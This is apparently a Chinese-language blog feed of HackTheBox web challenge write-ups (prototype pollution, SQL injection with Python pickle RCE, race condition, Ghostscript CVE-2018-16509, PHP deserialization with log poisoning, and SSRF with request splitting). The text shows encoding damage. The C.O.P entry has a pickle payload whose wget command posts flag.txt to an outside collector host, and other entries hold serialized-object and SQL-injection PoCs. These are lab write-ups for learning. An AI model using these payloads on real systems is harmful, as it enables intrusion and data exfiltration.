å¯¹è±¡åˆå¹¶ã€‚</li></ul></li></ul></li></ol><p>æ€»ç»“:<br>è¿™æ˜¯ä¸€ä¸ªç”¨äºå¯¹è±¡æ“ä½œçš„å®ç”¨ç¨‹åºæ¨¡å—ï¼Œæä¾›äº†å¯¹è±¡åˆå¹¶ã€å…‹éš†å’Œä¸€äº›åŸºæœ¬çš„éªŒè¯åŠŸèƒ½ã€‚ç‰¹åˆ«æ˜¯ï¼Œå®ƒé€šè¿‡ <code>isValidKey</code> æ–¹æ³•é˜²æ­¢äº†æ½œåœ¨çš„åŸå‹æ±¡æŸ“ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å®‰å…¨å®è·µã€‚</p><hr><p>å¾ˆå¥½ï¼ŒChatGPTè¯´è¿™æ®µä»£ç é‡‡å–äº†æŸäº›æ–¹å¼é˜²æ­¢â€œåŸå‹æ±¡æŸ“â€ï¼Œæ‰€è°“æ­¤åœ°æ— é“¶ä¸‰ç™¾ä¸¤ï¼Œè¿™ä¸ªé¢˜ç›®å…«æˆæ˜¯è¦æåŸå‹æ±¡æŸ“äº†ã€‚<del>ï¼ˆè„‘è¡¥è´¹ç¿”ï¼šå¥¹æ˜æ˜æ˜¯ç¥¥Rayï¼ï¼‰</del></p><p>æŸ¥é˜…è‹¥å¹²èµ„æ–™ä¹‹åï¼Œå¯¹NodeJSåŸå‹é“¾æ±¡æŸ“æ¼æ´å¤§æ¦‚æœ‰äº†ä¸ªäº†è§£ï¼Œç±»æ¯”ä¸€ä¸‹å°±æ˜¯ï¼Œè™½ç„¶é¾™ç”Ÿä¹å­å„æœ‰ä¸åŒï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬é€šè¿‡é¾™çš„æŸä¸ªå­å—£æ¯”å¦‚è²”è²…ï¼Œæ”¹å˜äº†é¾™çš„æŸä¸ªå±æ€§ï¼Œé‚£ä¹ˆå®ƒçš„ä¹ä¸ªå´½å„¿å°±éƒ½ä¼šç»§æ‰¿è¿™ä¸ªå±æ€§ï¼ˆå…¶å®ä¸æ°å½“ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨çš„æ—¶å€™å¦‚æœå½“å‰å¯¹è±¡æ²¡æœ‰è¿™ä¸ªå‚æ•°ï¼Œå°±ä¼šå‘å®ƒçš„çˆ¶å¯¹è±¡æœç´¢ï¼‰ã€‚</p><p>é¢˜ç›®ä¸­è¿‡æ»¤äº†å…³é”®å­—<code>&#39;__proto__&#39;</code>ï¼Œä½†æ˜¯é€šè¿‡<code>constructor.prototype</code>ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥å®ç°åŸå‹é“¾æ±¡æŸ“ã€‚æ¥ä¸‹æ¥æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œä¹Ÿå°±æ˜¯èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°å°±å¯ä»¥äº†ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©<code>DebugHelper.js</code>ä¸­çš„forkå‡½æ•°ã€‚</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-4.png" alt="fork"></p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>æ„é€ Payloadï¼Œè·å–Flagæ–‡ä»¶åï¼ˆå› ä¸ºæ ¹æ®DockerFileï¼ŒFlagæ–‡ä»¶åæ˜¯éšæœºçš„å­—ç¬¦ä¸²ï¼‰ï¼š</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-5.png" alt="calc"></p><p>ç„¶åè®¿é—®<code>/debug/version</code>æ‰§è¡Œpocï¼š</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-6.png" alt="ls"></p><p>æœ€åè¯»æ–‡ä»¶çš„å†…å®¹å°±å¥½äº†ï¼š</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-7.png" alt="flag"></p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-8.png" alt="flag"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p><del>åšHTBçœŸæ˜¯è¢«è¿«ä»é›¶å¼€å§‹å­¦ä¹ NodeJS</del></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">nodejsåŸå‹é“¾æ±¡æŸ“ #</a></li><li><a href="https://y3a.github.io/2021/06/15/htb-breaking-grad/">HackTheBox Breaking Grad</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> nodejsåŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox C.O.P WriteUP</title>
      <link href="/2023/08/29/HackTheBox-C-O-P-WriteUP/"/>
      <url>/2023/08/29/HackTheBox-C-O-P-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!</p></blockquote><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image.png" alt="challenge"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p><code>routes.py</code>ä¸­å¯ä»¥çœ‹åˆ°ä¸¤æ¡URIï¼š</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-1.png" alt="routes"></p><p>è·Ÿè¸ª<code>product_id</code>,å¯ä»¥çœ‹åˆ°æ­¤å¤„å¹¶æœªå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå­˜åœ¨SQLæ³¨å…¥ï¼š</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-2.png" alt="SQL injection"></p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>ç½‘ç«™ä½¿ç”¨äº†Jinja2 æ¨¡æ¿å¼•æ“ï¼Œä¸»é¡µä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-3.png" alt="index"></p><p>è¿™é‡Œä¼šå¾ªç¯è¯»å–å•†å“åˆ—è¡¨ï¼Œè·å–æ•°æ®åº“ä¸­å•†å“çš„ä¿¡æ¯ã€‚å¦å¤–æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç½‘ç«™è®¾ç½®äº†template_filter(â€˜pickleâ€™)ï¼Œæ‰€ä»¥è¿™é‡Œä¼šç”¨<code>pickle_loads(s)</code>å¤„ç†æ£€ç´¢æ¥çš„<code>product.data</code></p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-4.png" alt="app.py"></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€æ¡pythonçš„åºåˆ—åŒ–æ•°æ®ï¼Œä¼ å…¥pickle_loads(s)å¹¶æ‰§è¡Œï¼Œä»è€Œå®ç°RCEã€‚</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é¦–å…ˆä½¿ç”¨pythonæ„é€ ä¸€æ¡åºåˆ—åŒ–æ•°æ®ï¼Œè¿™é‡Œç…§ç€é¢˜ç›®ç»™çš„æºç å†™å°±å¯ä»¥äº†ã€‚</p><pre><code class="python">import pickle, base64import osclass Exploit(object):    def __reduce__(self):        cmd = (&quot;wget --post-file flag.txt mf5rw3jw4to5z0jk3gclnr8gs7yxmm.oastify.com&quot;)        return (os.system, (cmd,))malicious_payload = pickle.dumps(Exploit())print(base64.b64encode(malicious_payload).decode())</code></pre><p>è¾“å‡ºå‡ºæ¥çš„Payloadå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><pre><code>gASVXwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjER3Z2V0IC0tcG9zdC1maWxlIGZsYWcudHh0IG1mNXJ3M2p3NHRvNXowamszZ2NsbnI4Z3M3eXhtbS5vYXN0aWZ5LmNvbZSFlFKULg==</code></pre><p>ç„¶åæ„é€ SQLæ³¨å…¥Payload:</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-5.png" alt="payload"></p><p><strong>PWN!</strong></p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-6.png" alt="FLAG"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>å¼€å§‹åšé¢˜çš„æ—¶å€™é’»äº†ç‰›è§’å°–ï¼Œç»å°½è„‘æ±æƒ³æ€ä¹ˆæŠŠåºåˆ—åŒ–çš„æ•°æ®å†™åˆ°æ•°æ®åº“é‡Œã€‚</p><p>å…¶å®åªè¦è®©æŸ¥è¯¢è¯­å¥è¿”å›çš„å†…å®¹æ˜¯è‡ªå·±æ„é€ å¥½çš„åºåˆ—åŒ–æ•°æ®å°±å¯ä»¥äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> Pythonååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Diogenes&#39; Rage WriteUP</title>
      <link href="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>Having missed the flight as you walk down the street, a wild vending machine appears in your way. You check your pocket and there it is, yet another half torn voucher coupon to feed to the consumerism. You start wondering why should you buy things that you donâ€™t like with the money you donâ€™t have for the people you donâ€™t like. Youâ€™re Jackâ€™s raging bile duct.</p></blockquote><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image.png" alt="challenge"></p><blockquote><p><del>ä½ æ˜¯æ°å…‹æ±¹æ¶Œçš„èƒ†æ±å¯¼ç®¡</del></p></blockquote><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä¸€å¼€å§‹çœ‹äº†ç»„ä»¶ä»¥ä¸ºæ˜¯ä¸ªJWTçš„æ¼æ´ï¼Œç»å°½è„‘æ±æ²¡æœ‰æ‰¾åˆ°æ€è·¯ä¹‹åå‘ç°â€¦â€¦</p><p>æ˜¯ä¸ªæ¡ä»¶ç«äº‰ã€‚</p><p>æ·¦ã€‚</p><p>å­˜åœ¨æ¼æ´çš„ä»£ç å¦‚ä¸‹ï¼š</p><ul><li>database.js</li></ul><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-1.png" alt="vuln"></p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é¦–å…ˆè°ƒç”¨<code>/api/purchase</code>è·å–cookie</p><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-2.png" alt="cookie"></p><p>å¼€è¶³çº¿ç¨‹è·‘å°±å®Œäº†</p><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-3.png" alt="runï¼ï¼"></p><p>æ‹¿åˆ°Flag</p><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-4.png" alt="Flag"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p><del>ä¸‡ä¸‡æ²¡æƒ³åˆ°æœ‰ä¸€å¤©ä¼šå› ä¸ºç½‘é€Ÿæ‹¿ä¸åˆ°flag</del><br>æ¡ä»¶ç«äº‰æˆ‘æ€•ä¸æ˜¯è·‘äº†ä¸€ç™¾æ¬¡â€¦â€¦</p><blockquote><p>æ€»ä¹‹è¿™æ˜¯ä¸€ä¸ªä»å¤´åˆ°å°¾å……æ»¡æ§½ç‚¹çš„Challenge</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> æ¡ä»¶ç«äº‰ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox petpet rcbee WriteUP</title>
      <link href="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><blockquote><p>Bees are comfy ğŸ¯<br>bees are great ğŸŒŸğŸŒŸğŸŒŸ<br>this is a petpet generator ğŸ‘‹<br>letâ€™s join forces and save the bees today! ğŸ</p></blockquote><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image.png" alt="Bee"></p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-1.png" alt="Web"></p><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p><code>flag</code>æ–‡ä»¶çš„ä½ç½®å·²ç»ç»™å‡ºäº†ï¼Œé‚£ä¹ˆç›®æ ‡å¾ˆæ˜ç¡®ï¼Œå°±æ˜¯æƒ³åŠæ³•è¯»å–åˆ°è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</p><p>ä»£ç ä¸­åªæœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œpythonçš„ç«™ç‚¹é€šè¿‡ä¸Šä¼ æœ¨é©¬GetShellæ˜¾ç„¶æ˜¯æ¯”è¾ƒç½•è§çš„æ“ä½œï¼Œé‚£ä¹ˆæ›´æœ‰å¯èƒ½çš„è§£é¢˜æ€è·¯æ˜¯å¯¹ç»„ä»¶çš„æ¼æ´è¿›è¡Œåˆ©ç”¨ã€‚</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-2.png" alt="routers.py"></p><p><code>DockerFile</code>ä¸­å†™å…¥äº†å®‰è£…<code>Pillow+ghostscript</code>çš„å‘½ä»¤ï¼š</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-3.png" alt="dockerfile"></p><p>å…³äºè¿™ä¸¤ä¸ªç»„ä»¶çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥é—®ä¸€ä¸‹ç¥å¥‡çš„ChatGPTï¼š</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-4.png" alt="ChatGPT"></p><p><code>ghostscript-9.23</code>å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´è¯¦æƒ…å‚è€ƒï¼š<a href="https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509">Python PIL&#x2F;Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509</a></p><p>å¯¹ä»£ç è¿›è¡Œåˆ†æåå¯ä»¥å‘ç°ï¼Œå½“å‰çš„ä¸Šä¼ åŠŸèƒ½å®Œç¾ç¬¦åˆæ¼æ´çš„åˆ©ç”¨æ¡ä»¶ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œåªéœ€è¦æ‰¾åˆ°<code>flag</code>æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å°±å¯ä»¥äº†ã€‚è¿™å¾ˆå¥½æ‰¾ï¼š</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-5.png" alt="flag_path"></p><p>è·¯å¾„æ˜¯<code>/app/flag</code></p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>è¯»å–<code>/app/flag</code>å†…å®¹å¹¶å†™å…¥åˆ°å¯è®¿é—®çš„é™æ€è·¯å¾„ä¸‹ã€‚</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-6.png" alt="poc"></p><p>ç„¶åç›´æ¥è®¿é—®å†™å…¥çš„æ–‡ä»¶å³å¯ã€‚</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-7.png" alt="flag"></p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p><del>å¼€å§‹çš„æ—¶å€™æ‰¾é”™äº†ç»å¯¹è·¯å¾„ï¼Œè¿˜ä»¥ä¸ºæ€è·¯é”™äº†ã€‚</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> æ¼æ´åˆ©ç”¨ </tag>
            
            <tag> CVE-2018-16509 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Toxic WriteUP</title>
      <link href="/2023/08/23/HackTheBox-Toxic-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-Toxic-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. ğŸ¸</p></blockquote><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image.png" alt="Toxic"></p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-1.png" alt="Web"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æºä»£ç å¾ˆç®€å•ï¼Œåªæœ‰ä¸¤ä¸ªPHPæ–‡ä»¶</p><pre><code class="php">//index.php&lt;?phpspl_autoload_register(function ($name)&#123;    if (preg_match(&#39;/Model$/&#39;, $name))    &#123;        $name = &quot;models/$&#123;name&#125;&quot;;    &#125;    include_once &quot;$&#123;name&#125;.php&quot;;&#125;);if (empty($_COOKIE[&#39;PHPSESSID&#39;]))&#123;    $page = new PageModel;    $page-&gt;file = &#39;/www/index.html&#39;;    setcookie(        &#39;PHPSESSID&#39;,         base64_encode(serialize($page)),         time()+60*60*24,         &#39;/&#39;    );&#125; $cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);unserialize($cookie);</code></pre><pre><code class="php">//PageModel.php&lt;?phpclass PageModel&#123;    public $file;    public function __destruct()     &#123;        include($this-&gt;file);    &#125;&#125;</code></pre><p>å¾ˆæ˜¾ç„¶ï¼Œæ˜¯ä¸€ä¸ªPHPååºåˆ—åŒ–+æ–‡ä»¶åŒ…å«çš„æ¼æ´åˆ©ç”¨ã€‚</p><p>è¿™é‡Œå°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯åŒ…å«çš„æ—¥å¿—æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>nginx.conf</code>ä¸­æ‰¾åˆ°AccessLogæ–‡ä»¶çš„ä½ç½®ã€‚</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-2.png" alt="AccessLog"></p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>åˆ©ç”¨<code>User-Agent</code>å†™å…¥WebShellï¼š</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-3.png" alt="UA"></p><p>æ„é€ åŒ…å«AccessLogçš„åºåˆ—åŒ–æ•°æ®ï¼š</p><pre><code class="php">O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;//base64encodeTzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==</code></pre><p>åˆ©ç”¨WebShellè·å¾—æ–‡ä»¶åå’ŒFlag</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-4.png" alt="FileName"></p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-5.png" alt="Flag"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>éå¸¸ç®€å•çš„ä¸€ä¸ªChallengeï¼Œå¾ˆé€‚åˆä½œä¸ºå­¦ä¹ PHPååºåˆ—åŒ–çš„å…¥é—¨ç»ƒä¹ ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><blockquote><ul><li><a href="https://xz.aliyun.com/t/12507">phpååºåˆ—åŒ–å®Œæ•´æ€»ç»“</a></li></ul></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox WeatherAPP WriteUP</title>
      <link href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/"/>
      <url>/2023/08/22/HackTheBox-WeatherAPP-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think Iâ€™m hallucinating with the memories of my past life, itâ€™s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that Iâ€™ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa thatâ€™s operating this website and set me free! ğŸ§™â€â™€ï¸</p></blockquote><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image.png" alt="WeatherAPP"></p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-1.png" alt="Web"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¦–å…ˆçœ‹ä»£ç ï¼Œä»£ç ç»™æˆ‘ä»¬çš„çº¿ç´¢æœ‰ï¼š</p><ol><li>Flagåœ¨<code>/app/flag</code>ï¼Œéœ€è¦ä»¥adminè´¦æˆ·ç™»å½•ç³»ç»Ÿæ‰èƒ½è·å¾—ï¼›</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-2.png" alt="Flag File"></p><ol start="2"><li>adminè´¦å·çš„å¯†ç æ˜¯16è¿›åˆ¶32Byteå¤§å°çš„éšæœºå­—ç¬¦ä¸²ï¼Œæš´åŠ›ç ´è§£ä¸ç”¨è€ƒè™‘äº†ï¼›</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-3.png" alt="32Pass"></p><ol start="3"><li>æ³¨å†Œè´¦æˆ·åŠŸèƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼›</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-4.png" alt="SQL Injection"></p><ol start="4"><li>æ³¨å†Œè´¦æˆ·åŠŸèƒ½é™åˆ¶æºIPï¼Œä»…é™æœ¬åœ°ï¼ˆ127.0.0.1ï¼‰ä½¿ç”¨ï¼›</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-6.png" alt="Register"></p><ol start="5"><li>API<code>/api/weather</code>å­˜åœ¨SSRFæ¼æ´ï¼›</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-5.png" alt="SSRF"></p><p>è‡³æ­¤ï¼Œæ€è·¯åŸºæœ¬æ¸…æ™°ï¼Œå³ï¼š<strong>åˆ©ç”¨SSRFæ¼æ´ï¼Œè®©æœåŠ¡å™¨æäº¤æ³¨å†Œç”¨æˆ·è¯·æ±‚ï¼Œè¦†ç›–æ‰adminè´¦å·çš„å¯†ç ï¼Œä»è€Œå–å¾—Flagã€‚</strong></p><p>å”¯ä¸€ä¸€ä¸ªå°šæœªè§£å†³çš„é—®é¢˜æ˜¯ï¼Œ<code>/api/weather</code>æ¥å£åªèƒ½æäº¤GETè¯·æ±‚ï¼Œè€Œæ³¨å†Œç”¨æˆ·æ˜¯å¼ºåˆ¶è¯»å–<code>Request Body</code>ä¸­çš„æ•°æ®çš„ã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯»æ‰¾å…¶ä»–çº¿ç´¢ã€‚</p><p><code>package.json</code>ä¸­æ˜¾ç¤ºï¼ŒNodeJSç‰ˆæœ¬ä¸º8.12.0</p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-7.png" alt="NodeJS"></p><p>å½“å‰ç‰ˆæœ¬çš„NodeJSå­˜åœ¨HTTP Requestæ‹†åˆ†æ¼æ´ï¼Œè¯¦è§ï¼š<a href="https://hackerone.com/reports/409943">Node.js disclosed on HackerOne: Http request splitting</a></p><p>åˆ©ç”¨æ­¤æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é¡ºåˆ©é€šè¿‡æœåŠ¡å™¨æäº¤POSTè¡¨å•äº†ã€‚</p><p>å®Œæ•´æ€è·¯ï¼š</p><ol><li>åˆ©ç”¨SSRFä¼ªé€ æœåŠ¡å™¨è¯·æ±‚ï¼›</li><li>åˆ©ç”¨NodeJSç»„ä»¶æ¼æ´æäº¤POSTè¡¨å•ï¼›</li><li>åˆ©ç”¨æ³¨å†ŒåŠŸèƒ½çš„SQLæ³¨å…¥æ¼æ´è¦†ç›–æ‰adminè´¦æˆ·çš„å¯†ç ï¼›</li><li>ç™»å½•adminè´¦æˆ·ï¼Œè·å¾—Flagã€‚</li></ol><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>åˆ©ç”¨Pythonæ„é€ å¹¶æäº¤POCï¼š</p><pre><code class="python"># poc.pyimport requestspayload = &#39;&#39;&#39;127.0.0.1/ HTTP/1.1Host: http://127.0.0.1POST /register HTTP/1.1Host: http://127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 88Connection: closeusername=admin&amp;password=1234&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;admin&#39;;--GET / HTTP/1.1Host: http://127.0.0.1test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\r\n&quot;)payload = payload.replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;) \    .replace(&#39;+&#39;, &#39;\u012b&#39;) \    .replace(&#39; &#39;, &#39;\u0120&#39;) \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \    .replace(&#39;[&#39;, &#39;\u015b&#39;) \    .replace(&#39;]&#39;, &#39;\u015d&#39;) \    .replace(&#39;`&#39;, &#39;\u0127&#39;) \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \    .replace(&#39;[&#39;, &#39;\u015b&#39;) \    .replace(&#39;]&#39;, &#39;\u015d&#39;)print(payload)burp0_url = &quot;http://167.172.61.89:32702/api/weather&quot;burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Referer&quot;: &quot;http://167.172.61.89:32702/&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Origin&quot;: &quot;http://167.172.61.89:32702&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;sec-ch-ua-platform&quot;: &quot;\&quot;Windows\&quot;&quot;, &quot;sec-ch-ua&quot;: &quot;\&quot;Google Chrome\&quot;;v=\&quot;113\&quot;, \&quot;Chromium\&quot;;v=\&quot;113\&quot;, \&quot;Not=A?Brand\&quot;;v=\&quot;24\&quot;&quot;, &quot;sec-ch-ua-mobile&quot;: &quot;?0&quot;&#125;burp0_json=&#123;&quot;city&quot;: &quot;Tokyo&quot;, &quot;country&quot;: &quot;JP&quot;, &quot;endpoint&quot;: payload&#125;resp = requests.post(burp0_url, headers=burp0_headers, 